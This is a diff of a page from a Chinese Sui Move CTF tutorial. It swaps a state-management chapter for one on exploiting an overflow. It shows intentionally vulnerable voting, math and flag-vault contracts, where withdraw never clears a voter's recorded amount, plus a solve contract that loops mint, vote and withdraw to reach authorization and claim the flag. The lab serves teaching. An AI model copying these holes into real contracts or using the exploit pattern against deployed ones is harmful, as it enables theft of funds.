@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>实践：分析状态管理逻辑漏洞 - lets move ctf</title>
+        <title>实践：利用漏洞造成溢出实现攻击 - lets move ctf</title>
 
 
         <!-- Custom HTML head -->
@@ -155,14 +155,42 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="实践分析状态管理逻辑漏洞"><a class="header" href="#实践分析状态管理逻辑漏洞">实践：分析状态管理逻辑漏洞</a></h1>
-<pre><code>module chapter_6::vote {
-    use sui::coin::{Self, Coin, TreasuryCap};
-    use sui::transfer::{public_transfer, share_object, public_freeze_object};
+                        <h1 id="实践利用漏洞造成溢出实现攻击"><a class="header" href="#实践利用漏洞造成溢出实现攻击">实践：利用漏洞造成溢出实现攻击</a></h1>
+<h2 id="示例合约部分"><a class="header" href="#示例合约部分">示例合约部分</a></h2>
+<p><code>math::math_utils</code> 合约</p>
+<pre><code>module math::math_utils {
+
+    public fun calculate_weight( amount: u256): u256 {
+        let (weight, overflow) = check(amount);
+        if (overflow) {
+            999999999
+        } else {
+            weight
+        }
+    }
+
+
+    fun check(n: u256): (u256, bool) {
+        let num = 0xff &lt;&lt; 1;
+        if (n &gt; num) {
+            (0, true)
+        } else {
+            (n, false)
+        }
+    }
+}
+</code></pre>
+<p><code>vote::vote</code> 合约</p>
+<pre><code>module vote::vote {
+    use sui::coin::{Self, Coin};
+    use sui::transfer::share_object;
+    use sui::balance::{Balance};
+    use math::math_utils;
+    use sui::table;
+    use sui::table::Table;
+    use sui::transfer::public_freeze_object;
+    use sui::coin::TreasuryCap;
     use sui::vec_map::{Self, VecMap};
-    use sui::object_table::{Self, ObjectTable};
-    use std::string::String;
-    use sui::balance::Balance;
 
     public struct VOTE has drop {}
 
@@ -176,108 +204,131 @@
         mintlist: VecMap&lt;address, u64&gt;,
     }
 
-    public struct VoteStore has key {
+    public struct VotingSystem has key {
         id: UID,
-        proposals: ObjectTable&lt;String, Proposal&gt;,
-        voters: VecMap&lt;address, u64&gt;,
+        balance: Balance&lt;VOTE&gt;,
+        vote_list: Table&lt;address,u64&gt;,
+        is_authorized: bool,
     }
-
-    public struct Proposal has key, store {
-        id: UID,
-        owner: address,
-        votes: u64,
-        locked_tokens: Balance&lt;VOTE&gt;,
-        closed: bool,
-    }
-
-    const E_INVALID_AMOUNT: u64 = 1;
-    const E_INVALID_PROPOSAL: u64 = 2;
-    const E_ALREADY_MINTED: u64 = 3;
-    const E_UNAUTHORIZED: u64 = 4;
-    const E_PROPOSAL_CLOSED: u64 = 5;
 
     fun init(witness: VOTE, ctx: &amp;mut TxContext) {
         let (treasury_cap, meta) = coin::create_currency(
             witness, 6, b"VOTE", b"VOTE", b"", option::none(), ctx
         );
 
-        let vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };
+        let mut vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };
         let mintlist = Mintlist { id: object::new(ctx), mintlist: vec_map::empty() };
-        let store = VoteStore {
+        let coin = coin::mint(&amp;mut vote_cap.cap, 10000, ctx);
+        let balance = coin::into_balance(coin);
+
+        let system = VotingSystem {
             id: object::new(ctx),
-            proposals: object_table::new(ctx),
-            voters: vec_map::empty(),
+            balance: balance,
+            vote_list: table::new&lt;address,u64&gt;(ctx),
+            is_authorized: false,
         };
-
-
         public_freeze_object(meta);
+        share_object(system);
         share_object(vote_cap);
         share_object(mintlist);
-        share_object(store);
     }
 
-    public entry fun mint(
+    public fun mint(
         vote_cap: &amp;mut Votecap,
         mint_list: &amp;mut Mintlist,
         ctx: &amp;mut TxContext
-    ) {
+    ): Coin&lt;VOTE&gt; {
         let addr = tx_context::sender(ctx);
-        assert!(!vec_map::contains(&amp;mint_list.mintlist, &amp;addr), E_ALREADY_MINTED);
+        assert!(!vec_map::contains(&amp;mint_list.mintlist, &amp;addr), 1);
         let coin = coin::mint(&amp;mut vote_cap.cap, 100, ctx);
         vec_map::insert(&amp;mut mint_list.mintlist, addr, 100);
-        public_transfer(coin, addr);
-    }
-
-    public entry fun create_proposal(
-        store: &amp;mut VoteStore,
-        name: String,
-        ctx: &amp;mut TxContext
-    ) {
-        assert!(!object_table::contains(&amp;store.proposals, name), E_INVALID_PROPOSAL);
-        let proposal = Proposal {
-            id: object::new(ctx),
-            owner: tx_context::sender(ctx),
-            votes: 0,
-            locked_tokens: zero&lt;VOTE&gt;(),
-            closed: false,
-        };
-        object_table::add(&amp;mut store.proposals, name, proposal);
+        coin
     }
 
     public entry fun vote(
-        store: &amp;mut VoteStore,
+        system: &amp;mut VotingSystem,
         vote_coin: Coin&lt;VOTE&gt;,
-        proposal_name: String,
         ctx: &amp;mut TxContext
     ) {
-        assert!(vote_coin.value() &gt; 0, E_INVALID_AMOUNT);
-        assert!(object_table::contains(&amp;store.proposals, proposal_name), E_INVALID_PROPOSAL);
-        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
         let sender = tx_context::sender(ctx);
-        let amount = coin::into_balance(vote_coin);
-        if (vec_map::contains(&amp;store.voters, &amp;sender)) {
-            let voter_amount = vec_map::get_mut(&amp;mut store.voters, &amp;sender);
-            *voter_amount = *voter_amount + amount.value();
+        let amount = coin::value(&amp;vote_coin);
+
+        system.balance.join(coin::into_balance(vote_coin));
+
+        if (table::contains(&amp;system.vote_list, sender)) {
+            let current_amount = table::borrow_mut(&amp;mut system.vote_list, sender);
+            *current_amount = *current_amount + amount;
         } else {
-            vec_map::insert(&amp;mut store.voters, sender, amount.value());
+            table::add(&amp;mut system.vote_list, sender, amount);
         };
-        proposal.votes = proposal.votes + amount.value();
-        proposal.locked_tokens.join(amount);
+
+        let total_amount = *table::borrow(&amp;system.vote_list, sender);
+        let weight = math_utils::calculate_weight(total_amount as u256);
+        if (weight &gt; 1000000) {
+            system.is_authorized = true;
+        }
     }
 
-    public entry fun close_proposal(
-        store: &amp;mut VoteStore,
-        proposal_name: String,
+    public fun withdraw(
+        system: &amp;mut VotingSystem,
+        ctx: &amp;mut TxContext
+    ) : Coin&lt;VOTE&gt; {
+        let amount = table::borrow(&amp; system.vote_list, ctx.sender());
+        let coin = coin::from_balance(system.balance.split(*amount), ctx);
+        coin
+    }
+
+    public fun is_authorized(system: &amp;VotingSystem): bool {
+        system.is_authorized
+    }
+}
+</code></pre>
+<p><code>vote::flag_vault</code> 合约</p>
+<pre><code>module vote::flag_vault {
+    use sui::event::emit;
+    use vote::vote::{Self, VotingSystem};
+    use std::string::{Self, String};
+
+    public struct FlagEvent has copy, drop {
+        flag: String,
+        sender: address
+    }
+
+    public entry fun get_flag(
+        system: &amp;VotingSystem,
         ctx: &amp;mut TxContext
     ) {
-        assert!(object_table::contains(&amp;store.proposals, proposal_name), E_INVALID_PROPOSAL);
-        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
+        assert!(vote::is_authorized(system), 1);
         let sender = tx_context::sender(ctx);
-        assert!(sender == proposal.owner, E_UNAUTHORIZED);
-        assert!(!proposal.closed, E_PROPOSAL_CLOSED);
-        proposal.closed = true;
-        let coin = coin::from_balance(proposal.locked_tokens.withdraw_all(), ctx);
-        public_transfer(coin, sender);
+        emit(FlagEvent{flag: string::utf8(b"CTF{Letsctf_chapter_7}"),sender: sender});
+    }
+}
+</code></pre>
+<h2 id="解题合约部分"><a class="header" href="#解题合约部分">解题合约部分</a></h2>
+<pre><code>module solve_chapter_7::solve_chapter_7{
+
+    use vote::vote::{mint, vote, withdraw, Votecap, Mintlist, VotingSystem};
+    use vote::flag_vault::get_flag;
+
+    public fun solve(
+        vote_cap: &amp;mut Votecap,
+        mint_list: &amp;mut Mintlist,
+        system: &amp;mut VotingSystem,
+        ctx: &amp;mut TxContext
+    ){
+        let coin = mint(vote_cap, mint_list, ctx);
+        //100
+        vote(system,coin,ctx);
+        let coin1 = withdraw(system, ctx);
+        //200
+        vote(system,coin1,ctx);
+        let coin2 = withdraw(system, ctx);
+        //400
+        vote(system,coin2,ctx);
+        let coin3 = withdraw(system, ctx);
+        //800
+        vote(system,coin3,ctx);
+        get_flag(system,ctx);
     }
 }
 </code></pre>
@@ -286,11 +337,11 @@
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                            <a rel="prev" href="../../ctfbook/chapter_6/state_management.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="../../ctfbook/chapter_7/cross_module.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
 
-                            <a rel="next prefetch" href="../../ctfbook/chapter_7/intro.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next prefetch" href="../../ctfbook/chapter_8/intro.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
 
@@ -300,11 +351,11 @@
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                    <a rel="prev" href="../../ctfbook/chapter_6/state_management.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="../../ctfbook/chapter_7/cross_module.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
 
-                    <a rel="next prefetch" href="../../ctfbook/chapter_7/intro.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next prefetch" href="../../ctfbook/chapter_8/intro.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
